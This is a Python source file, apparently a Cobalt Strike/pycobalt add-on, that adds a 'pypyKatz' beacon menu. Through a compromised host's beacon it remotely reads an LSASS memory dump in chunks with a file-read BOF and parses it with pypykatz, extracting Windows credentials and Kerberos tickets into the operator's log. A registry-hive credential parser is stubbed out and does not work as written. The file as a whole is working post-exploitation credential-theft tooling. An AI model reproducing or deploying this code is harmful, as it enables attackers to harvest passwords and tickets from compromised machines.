#!/usr/bin/env python3

import os
import math
import random
import base64
import datetime

import pycobalt.engine as engine
import pycobalt.aggressor as aggressor
import pycobalt.aliases as aliases
import pycobalt.engine as engine
import pycobalt.gui as gui
import pycobalt.events as events

from pypykatz.pypykatz import pypykatz


def convert_size(size_bytes):
	if size_bytes == 0:
		return "0B"
	size_name = ("B", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB")
	i = int(math.floor(math.log(size_bytes, 1024)))
	p = math.pow(1024, i)
	s = round(size_bytes / p, 2)
	return "%s %s" % (s, size_name[i])

# dummy event handler for data in, this will not be invoked but needs to be set
# so we can recieve the file data.
def beacon_output_handler(bid, text, timestamp):
	try:
		engine.message('beacon_output_handler invoked. This should never happen!!!')
	except Exception as e:
		engine.message('CB ERROR! %s ' % e)

events.register('beacon_output', beacon_output_handler, official_only=True)

# This class represents a chunk of the minidump file, and holds its bytes
class FileSection:
	def __init__(self, startpos, data):
		self.startpos = startpos
		self.endpos = startpos + len(data)
		self.data = data

	def inrange(self, start, size):
		if start >= self.startpos and (start+size) <= self.endpos:
			return True
		return False
	
	def read(self, start, size):
		return self.data[ start - self.startpos : (start - self.startpos) + size]

	def __str__(self):
		return '[SECTION] %s - %s (len: %s)' % (hex(self.startpos), hex(self.endpos), convert_size(self.endpos - self.startpos))

# Virtual file object
class BaconFileReader:
	def __init__(self, bacon_id, filepath, bof_path, chunksize = 1024*20):
		self.filepath = filepath
		self.bacon_id = bacon_id
		self.cache = []
		self.curpos = 0		
		self.maxreadsize = chunksize
		self.minreadsize = 1024*10
		self.bof_path = bof_path
		self.replyid = random.randint(1, 250*1024)
	
	def __str__(self):
		t = ''
		total = 0
		i = 0
		for section in self.cache:
			i += 1
			total += section.endpos - section.startpos
			t += str(section) + '\r\n'
		t += 'TOTAL CHUNKS: %s' % i
		t += 'TOTAL DOWNLOADED: %s' % convert_size(total)
		return t
	
	def __bacon_read(self, n, offset):
		engine.message('replyid %s' % self.replyid)
		engine.message('offset %s' % offset)
		engine.message('N %s' % n)
		engine.message('bof_path %s' % self.bof_path)
		engine.message('start reading....')
		engine.call('rfs', [self.bacon_id, self.bof_path, self.filepath, n, offset, self.replyid])

		# dont ask... just dont...
		# manual callback processing because of blocking thread stops the entire execution
		for name, message in engine.read_pipe_iter():
			#engine.message('readiter')
			#engine.message(name)
			#engine.message(message)

			if name == 'callback':
				# dispatch callback
				callback_name = message['name']
				callback_args = message['args'] if 'args' in message else []

				if callback_name.startswith('event_beacon_output') is True:
					if callback_args[0] == str(self.bacon_id):
						data = callback_args[1].replace('received output:\n', '')
						data = data.replace('\n', '').strip()
						#engine.message('!data!: %s' % data)
						if data.startswith('[DATA]') is True:
							data = data.split(' ')[1]
							#print(base64.b64decode(data))
							return base64.b64decode(data)
						elif data.startswith('[FAIL]') is True:
							raise Exception('File read failed! %s' % data)
			else:
				try:
					engine.handle_message(name, message)
				except Exception as e:
					engine.handle_exception_softly(e)
		

	def read(self, n = -1):
		#engine.message('read %s' % n)
		if n == 0:
			return b''

		if n != -1:
			for section in self.cache:
				if section.inrange(self.curpos, n) is True:
					#engine.message(n)
					data = section.read(self.curpos, n)					
					#engine.message(data)
					self.seek(n, 1)
					return data

		# requested data not found in cache, this case we will read a larger chunk than requested and store it in memory
		# since reading more data skews the current position we will need to reset the position by calling seek with the correct pos

		readsize = min(self.maxreadsize, n)
		readsize = max(self.minreadsize, readsize)
		buffer = b''

		engine.message('READ offset %s' % self.curpos)
		engine.message('READ N %s' % n)

		# this is needed bc sometimes the readsize is smaller than the requested amount
		for _ in range(int(math.ceil(n/readsize))):
			data = self.__bacon_read(readsize, self.curpos+len(buffer))
			buffer += data
		
		section = FileSection(self.curpos, buffer)
		self.cache.append(section)
		
		data = section.read(self.curpos, n)
		self.seek(self.curpos + n, 0)
		return data
	
	def tell(self):
		return self.curpos
	
	def seek(self, n, whence = 0):
		#engine.message('seek N: %s WHEN: %s ' % (n, whence))
		if whence == 0:
			self.curpos = n
		elif whence == 1:
			self.curpos += n
		elif whence == 2:
			self.curpos -= n
		else:
			raise Exception('What whence?')

def beacon_top_callback(bids):
	engine.message('showing menu for: ' + ', '.format(bids))

def parse_lsass(bid, filepath, boffilepath, chunksize, packages = ['all'], outputs = ['text']):
	engine.message('parse_lsass invoked')
	engine.message('bid %s' % bid)
	engine.message('filepath %s' % filepath)
	engine.message('chunksize %s' % chunksize)
	engine.message('packages %s' % (','.join(packages)))

	starttime = datetime.datetime.utcnow()
	bfile = BaconFileReader(bid, filepath, boffilepath, chunksize = chunksize)
	mimi = pypykatz.parse_minidump_external(bfile, chunksize=chunksize, packages=packages)
	engine.message(str(bfile))
	endtime = datetime.datetime.utcnow()
	runtime = (endtime-starttime).total_seconds()
	engine.message('TOTAL RUNTIME: %ss' % runtime)

	if 'text' in outputs:
		engine.message(str(mimi))
		aggressor.blog(bid, str(mimi))
	
	if 'json' in outputs:
		engine.message(mimi.to_json())
		aggressor.blog(bid, mimi.to_json())
	
	if 'grep' in outputs:
		engine.message(mimi.to_grep())
		aggressor.blog(bid, mimi.to_grep())

def	parse_registry(bid, boffilepath, system_filepath, sam_filepath = None, security_filepath = None, software_filepath = None, chunksize = 10240, outputs = ['text']):
	engine.message('parse_registry invoked')
	engine.message('bid %s' % bid)
	engine.message('system_filepath %s' % system_filepath)
	engine.message('sam_filepath %s' % sam_filepath)
	engine.message('security_filepath %s' % security_filepath)
	engine.message('software_filepath %s' % software_filepath)
	engine.message('chunksize %s' % chunksize)
	engine.message('packages %s' % (','.join(packages)))

	engine.message('not yet implemented')
	#starttime = datetime.datetime.utcnow()
	#bfile = BaconFileReader(bid, filepath, boffilepath, chunksize = chunksize)
	#mimi = pypykatz.parse_minidump_external(bfile, chunksize=chunksize, packages=packages)
	#engine.message(str(bfile))
	#endtime = datetime.datetime.utcnow()
	#runtime = (endtime-starttime).total_seconds()
	#engine.message('TOTAL RUNTIME: %ss' % runtime)
	#
	#if 'text' in outputs:
	#	engine.message(str(mimi))
	#	aggressor.blog(bid, str(mimi))
	#
	#if 'json' in outputs:
	#	engine.message(mimi.to_json())
	#	aggressor.blog(bid, mimi.to_json())
	#
	#if 'grep' in outputs:
	#	engine.message(mimi.to_grep())
	#	aggressor.blog(bid, mimi.to_grep())


def dialog_callback_lsass(dialog, button_name, values_dict):
	engine.message('dialog_callback_lsass invoked!')
	engine.message('button_name %s' % button_name)
	engine.message('values_dict %s' % str(values_dict))

	chunksize = int(values_dict['chunksize']) * 1024
	filepath = values_dict['filepath']
	boffilepath = values_dict['boffilepath']
	bid = values_dict['bid']
	packages = []
	outputs = []

	for pkg in ['all', 'msv','wdigest','kerberos','ktickets','ssp','livessp','tspkg' ,'cloudap']:
		if pkg in values_dict and values_dict[pkg] == 'true':
			packages.append(pkg)
	
	if len(packages) == 0:
		aggressor.show_error("No packages were defined! LSASS parsing will not start!")
		return
	
	for output in ['json','text', 'grep']:
		if output in values_dict and values_dict[output] == 'true':
			outputs.append(output)

	if len(outputs) == 0:
		aggressor.show_error("No output format(s) selected! LSASS parsing will not start!")
		return

	parse_lsass(bid, filepath, boffilepath, chunksize, packages = packages, outputs = outputs)



def dialog_callback_registry(dialog, button_name, values_dict):
	engine.message('dialog_callback_lsass invoked!')
	engine.message('button_name %s' % button_name)
	engine.message('values_dict %s' % str(values_dict))

	chunksize = int(values_dict['chunksize']) * 1024
	system_filepath = values_dict['system_filepath']
	sam_filepath = values_dict['sam_filepath']
	security_filepath = values_dict['security_filepath']
	software_filepath = values_dict['software_filepath']
	boffilepath = values_dict['boffilepath']
	bid = values_dict['bid']
	outputs = []
	
	for output in ['json','text', 'grep']:
		if output in values_dict and values_dict[output] == 'true':
			outputs.append(output)

	if len(outputs) == 0:
		aggressor.show_error("No output format(s) selected! LSASS parsing will not start!")
		return

	parse_registry(bid, boffilepath, system_filepath, sam_filepath = sam_filepath, security_filepath = security_filepath, software_filepath = software_filepath, chunksize = chunksize, outputs = outputs)



def render_dialog_pypykatz_lsass(bid):
	drows = {
		'filepath': 'C:\\Users\\Administrator\\Desktop\\lsass.DMP',
		'boffilepath': 'bof/fileread.o',
		'chunksize' : '10',
		'all' : "true",
		'msv' : "false",
		'wdigest' : "false",
		'kerberos' : "false",
		'ktickets' : "false",
		'ssp' : "false",
		'livessp' : "false",
		'tspkg' : "false",
		'cloudap' : "false",
		'json' : "false",
		'text' : "false",
		'grep' : "true",
		'bid' : bid,
	}

	dialog = aggressor.dialog("LSASS file dump parsing", drows, dialog_callback_lsass)
	aggressor.drow_text(dialog, "filepath", "Remote LSASS file path (UNC supported as well)")
	aggressor.drow_file(dialog, "boffilepath", "File readBOF file path (local)")
	aggressor.drow_text(dialog, "chunksize", "chunksize to use in kb")
	aggressor.drow_checkbox(dialog, "all", "all (module)", "")
	aggressor.drow_checkbox(dialog, "msv", "msv (module)", "")
	aggressor.drow_checkbox(dialog, "wdigest", "wdigest (module)", "")
	aggressor.drow_checkbox(dialog, "kerberos", "kerberos (module)", "")
	aggressor.drow_checkbox(dialog, "ktickets", "ktickets (module)", "")
	aggressor.drow_checkbox(dialog, "ssp", "ssp (module)", "")
	aggressor.drow_checkbox(dialog, "livessp", "livessp (module)", "")
	aggressor.drow_checkbox(dialog, "tspkg", "tspkg (module)", "")
	aggressor.drow_checkbox(dialog, "cloudap", "cloudap (module)", "")
	aggressor.drow_checkbox(dialog, "json", "Output to json", "")
	aggressor.drow_checkbox(dialog, "text", "Output to text", "")
	aggressor.drow_checkbox(dialog, "grep", "Output to grep", "")
	aggressor.dbutton_action(dialog, "START")
	aggressor.dialog_show(dialog)


def render_dialog_pypykatz_registry(bid):
	drows = {
		'system_filepath': 'C:\\Users\\Administrator\\Desktop\\lsass.DMP',
		'sam_filepath': 'C:\\Users\\Administrator\\Desktop\\lsass.DMP',
		'security_filepath': 'C:\\Users\\Administrator\\Desktop\\lsass.DMP',
		'software_filepath': 'C:\\Users\\Administrator\\Desktop\\lsass.DMP',
		'boffilepath': 'bof/fileread.o',
		'chunksize' : '10',
		'json' : "false",
		'text' : "true",
		'bid' : bid,
	}

	dialog = aggressor.dialog("Registry hive file parsing", drows, dialog_callback_registry)
	aggressor.drow_text(dialog, "system_filepath", "Remote SYSTEM hive file path (UNC supported as well)")
	aggressor.drow_text(dialog, "sam_filepath", "Remote SAM hive file path (UNC supported as well)")
	aggressor.drow_text(dialog, "security_filepath", "Remote SECURITY hive file path (UNC supported as well)")
	aggressor.drow_text(dialog, "software_filepath", "Remote SOFTWARE hive file path (UNC supported as well)")
	aggressor.drow_file(dialog, "boffilepath", "File readBOF file path (local)")
	aggressor.drow_text(dialog, "chunksize", "chunksize to use in kb")
	aggressor.drow_checkbox(dialog, "json", "Output to json", "")
	aggressor.drow_checkbox(dialog, "text", "Output to text", "")
	aggressor.dbutton_action(dialog, "START")
	aggressor.dialog_show(dialog)


def lsass_start_cb(bids):
	engine.message(len(bids))
	render_dialog_pypykatz_lsass(bids[0])

def registry_start_cb(bids):
	engine.message(len(bids))
	engine.message('registry parse cb called!')
	render_dialog_pypykatz_registry(bids[0])

menu = gui.popup('beacon_top', callback=beacon_top_callback, children=[
	gui.menu('pypyKatz', children=[
		gui.insert_menu('pypykatz_top'),
		gui.item('LSASS dump parse', callback=lsass_start_cb),
		gui.separator(),
		gui.item('REGISTRY dump parse', callback=registry_start_cb),
	]),
])
gui.register(menu)

# read commands from cobaltstrike. must be called last
engine.loop()
